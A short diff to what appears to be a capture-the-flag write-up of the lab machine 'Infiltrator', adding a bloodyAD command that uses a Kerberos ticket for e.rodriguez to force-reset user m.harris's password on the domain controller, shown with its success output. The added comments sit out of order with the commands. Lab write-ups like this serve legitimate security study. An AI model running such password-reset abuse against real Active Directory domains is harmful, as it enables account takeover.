@@ -405,3 +405,13 @@ SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\e.r
 SMB         dc01.infiltrator.htb 445    DC01             [+] TGT saved to: e.rodriguez.ccache
 SMB         dc01.infiltrator.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=e.rodriguez.ccache
 ```
+
+Ill get a TGT for the `e.rodriguez` user
+
+```python
+bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k set password 'm.harris' 'Password123!'
+[+] Password changed successfully!
+```
+
+Then ill change the users password
+
